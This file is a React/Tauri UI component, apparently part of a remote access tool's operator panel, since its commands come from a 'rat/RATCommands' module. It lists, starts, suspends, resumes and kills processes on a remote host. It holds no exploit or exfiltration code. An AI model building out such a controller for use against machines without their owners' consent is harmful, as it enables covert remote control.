import { useEffect, useState } from "react";
import { ProcessType } from "../../types";
import {
  processListCmd,
  killProcessCmd,
  handleProcessCmd,
  startProcessCmd,
} from "../rat/RATCommands";
import { listen } from "@tauri-apps/api/event";
import { useParams } from "react-router-dom";
import {
  IconRefresh,
  IconProgressX,
  IconCpu,
  IconSearch,
  IconInfoCircle,
  IconPlayerPause,
  IconPlayerPlay,
  IconTerminal2,
} from "@tabler/icons-react";

export const ProcessViewer: React.FC = () => {
  const { addr } = useParams();
  const [processes, setProcesses] = useState<ProcessType[] | null>(null);
  const [processFilter, setProcessFilter] = useState("");
  const [loading, setLoading] = useState(false);
  const [startProcessName, setStartProcessName] = useState("notepad.exe");
  const [actionLoading, setActionLoading] = useState<{
    [key: string]: boolean;
  }>({});

  const handleKillProcess = async (pid: string, name: string) => {
    try {
      await killProcessCmd(addr, parseInt(pid), name);
      // Remove the process from the local state
      setProcesses((prevProcesses) =>
        prevProcesses
          ? prevProcesses.filter((process) => process.pid !== pid)
          : null
      );
    } catch (error) {
      console.error("Failed to kill process:", error);
    }
  };

  const handleSuspendProcess = async (pid: string, name: string) => {
    setActionLoading({ ...actionLoading, [`suspend-${pid}`]: true });
    try {
      await handleProcessCmd(addr, "suspend", parseInt(pid), name);
    } catch (error) {
      console.error("Failed to suspend process:", error);
    } finally {
      setActionLoading({ ...actionLoading, [`suspend-${pid}`]: false });
    }
  };

  const handleResumeProcess = async (pid: string, name: string) => {
    setActionLoading({ ...actionLoading, [`resume-${pid}`]: true });
    try {
      await handleProcessCmd(addr, "resume", parseInt(pid), name);
    } catch (error) {
      console.error("Failed to resume process:", error);
    } finally {
      setActionLoading({ ...actionLoading, [`resume-${pid}`]: false });
    }
  };

  const handleStartProcess = async () => {
    if (!addr || !startProcessName.trim()) return;
    setActionLoading({ ...actionLoading, start: true });

    try {
      await startProcessCmd(addr, startProcessName);
      // After starting the process, refresh the list
      fetchProcessList();
    } catch (error) {
      console.error("Failed to start process:", error);
    } finally {
      setActionLoading({ ...actionLoading, start: false });
    }
  };

  useEffect(() => {
    const unlisten = listen("process_list", (event: any) => {
      if (event.payload.addr === addr) {
        const parsedProcesses = event.payload.processes.map(
          (process: { pid: number; name: string }) => ({
            pid: process.pid.toString(),
            name: process.name,
          })
        );

        parsedProcesses.sort((a: any, b: any) => {
          return parseInt(a.pid) - parseInt(b.pid);
        });

        setProcesses(parsedProcesses);
        setLoading(false);
      }
    });

    fetchProcessList();

    return () => {
      unlisten.then((fn) => fn());
    };
  }, []);

  async function fetchProcessList() {
    setLoading(true);
    await processListCmd(addr);
  }

  const filteredProcesses = processes
    ? processes.filter((process) =>
        process.name.toLowerCase().includes(processFilter.toLowerCase())
      )
    : [];

  return (
    <div className="p-6 flex flex-1 flex-col overflow-auto w-full bg-primarybg h-screen">
      <div className="flex justify-between items-center mb-6">
        <div className="flex items-center gap-2">
          <IconCpu size={28} className="text-accentx" />
          <h2 className="text-xl font-medium text-white">Process Viewer</h2>
        </div>
      </div>

      <div className="flex flex-wrap justify-between items-center mb-5">
        <div className="flex items-center gap-4">
          <button
            className="px-4 py-2.5 bg-secondarybg text-white hover:bg-white hover:text-black border border-gray-500 hover:border-accentx transition-all duration-200 rounded-lg flex items-center gap-2 cursor-pointer"
            onClick={fetchProcessList}
            disabled={loading}
          >
            <IconRefresh size={18} className={loading ? "animate-spin" : ""} />
            {loading ? "Refreshing..." : "Refresh Processes"}
          </button>

          <div className="relative w-64">
            <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
              <IconSearch size={18} className="text-gray-400" />
            </div>
            <input
              value={processFilter}
              onChange={(e) => setProcessFilter(e.target.value)}
              type="text"
              className="pl-10 pr-4 py-2.5 w-full text-sm bg-secondarybg rounded-lg border border-gray-500 focus:border-accentx focus:outline-none focus:ring-1 focus:ring-accentx transition-all"
              placeholder="Filter processes..."
            />
          </div>
        </div>

        <div className="flex items-center">
          <input
            type="text"
            value={startProcessName}
            onChange={(e) => setStartProcessName(e.target.value)}
            className="w-52 py-2.5 px-3 bg-secondarybg text-white border border-gray-500 rounded-l-lg focus:border-accentx focus:outline-none"
            placeholder="Process name (e.g., notepad.exe)"
            onKeyDown={(e) => {
              if (e.key === "Enter") {
                handleStartProcess();
              }
            }}
          />
          <button
            onClick={handleStartProcess}
            disabled={!startProcessName.trim() || actionLoading["start"]}
            className={`px-4 py-2.5 rounded-r-lg flex items-center gap-2 border border-l-0 ${
              !startProcessName.trim() || actionLoading["start"]
                ? "bg-gray-700 text-gray-400 border-white cursor-not-allowed"
                : "bg-accentx text-white hover:text-black hover:bg-white border-accentx cursor-pointer"
            }`}
          >
            {actionLoading["start"] ? (
              <IconRefresh size={18} className="animate-spin" />
            ) : (
              <IconTerminal2 size={18} />
            )}
            Start
          </button>
        </div>
      </div>

      <div className="bg-secondarybg rounded-xl border border-accentx overflow-hidden flex-1">
        <div className="overflow-auto h-full">
          <table className="w-full text-sm text-left">
            <thead className="bg-primarybg text-gray-300 text-xs uppercase">
              <tr>
                <th className="px-6 py-3 w-24">PID</th>
                <th className="px-6 py-3">Process Name</th>
                <th className="px-6 py-3 text-right w-60">Actions</th>
              </tr>
            </thead>
            <tbody>
              {filteredProcesses.length > 0 ? (
                filteredProcesses.map((process, index) => (
                  <tr
                    key={index}
                    className="border-b border-accentx hover:bg-accentx"
                  >
                    <td className="px-6 py-3 font-mono">{process.pid}</td>
                    <td className="px-6 py-3">{process.name}</td>
                    <td className="px-6 py-3 text-right">
                      <div className="flex items-center justify-end gap-1">
                        <button
                          className="cursor-pointer px-3 py-1.5 bg-amber-700 text-white hover:bg-amber-600 rounded flex items-center gap-1.5 text-xs font-medium transition-colors"
                          onClick={() =>
                            handleSuspendProcess(process.pid, process.name)
                          }
                          disabled={actionLoading[`suspend-${process.pid}`]}
                        >
                          {actionLoading[`suspend-${process.pid}`] ? (
                            <IconRefresh size={14} className="animate-spin" />
                          ) : (
                            <IconPlayerPause size={14} />
                          )}
                          Suspend
                        </button>
                        <button
                          className="cursor-pointer px-3 py-1.5 bg-green-700 text-white hover:bg-green-600 rounded flex items-center gap-1.5 text-xs font-medium transition-colors"
                          onClick={() =>
                            handleResumeProcess(process.pid, process.name)
                          }
                          disabled={actionLoading[`resume-${process.pid}`]}
                        >
                          {actionLoading[`resume-${process.pid}`] ? (
                            <IconRefresh size={14} className="animate-spin" />
                          ) : (
                            <IconPlayerPlay size={14} />
                          )}
                          Resume
                        </button>
                        <button
                          className="cursor-pointer px-3 py-1.5 bg-red-900 text-white hover:bg-red-700 rounded flex items-center gap-1.5 text-xs font-medium transition-colors"
                          onClick={() =>
                            handleKillProcess(process.pid, process.name)
                          }
                        >
                          <IconProgressX size={14} />
                          Kill
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan={3} className="px-6 py-12 text-center">
                    {processes === null ? (
                      <div className="flex flex-col items-center justify-center text-gray-400">
                        <IconRefresh size={24} className="animate-spin mb-2" />
                        <p>Loading processes...</p>
                      </div>
                    ) : processFilter ? (
                      <div className="flex flex-col items-center justify-center text-gray-400">
                        <IconSearch size={24} className="mb-2" />
                        <p>No processes match your filter</p>
                      </div>
                    ) : (
                      <div className="flex flex-col items-center justify-center text-gray-400">
                        <IconInfoCircle size={24} className="mb-2" />
                        <p>No processes found</p>
                      </div>
                    )}
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>

      {processes && filteredProcesses.length > 0 && (
        <div className="mt-3 text-xs text-gray-400">
          Showing {filteredProcesses.length} of {processes.length} processes
        </div>
      )}
    </div>
  );
};
